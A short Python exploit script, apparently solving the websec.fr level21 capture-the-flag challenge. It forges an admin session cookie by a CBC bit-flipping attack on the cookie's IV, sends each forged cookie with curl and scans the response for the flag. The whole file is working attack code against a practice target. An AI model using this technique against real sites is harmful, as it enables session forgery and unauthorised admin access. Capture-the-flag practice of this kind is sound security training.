#!/usr/bin/env python3
import binascii
import subprocess
import re

cookie = "3d2d8bf19f0ce326f736a1443b952355b1fad1874477f658622708ae3c2b008c833e083ffd1bce3a3d4a8e0094382e53"

iv_hex = cookie[:32]
ct_hex = cookie[32:]

actual = b"user/pass:testxx"

# Probar diferentes usernames de 6 caracteres
alternatives = [
    b"user/pass:Admin ",  # Con A mayúscula
    b"user/pass:ADMIN ",  # Todo mayúscula
    b"user/pass:admin\n",  # Con newline
    b"user/pass:admin\t",  # Con tab
    b"user/pass:admin\r",  # Con carriage return
]

for target in alternatives:
    iv_test = bytearray(binascii.unhexlify(iv_hex))
    
    for i in range(16):
        iv_test[i] = iv_test[i] ^ actual[i] ^ target[i]
    
    cookie_test = binascii.hexlify(iv_test).decode() + ct_hex
    
    cmd = f'timeout 8s curl -s https://websec.fr/level21/index.php --cookie "session={cookie_test}"'
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    flag_match = re.search(r'WEBSEC\{[^}]+\}', result.stdout)
    if flag_match:
        print(f"★★★ FLAG con {target[10:16]}: {flag_match.group(0)} ★★★")
        break
    elif "Hello admin" in result.stdout:
        print(f"★★★ Hello admin con {target[10:16]}! ★★★")
        print(result.stdout[800:1200])
        break
    else:
        status = "Wrong" if "Wrong" in result.stdout else ("Corrupted" if "corrupted" in result.stdout else f"{len(result.stdout)}b")
        print(f"{target[10:16]}: {status}")

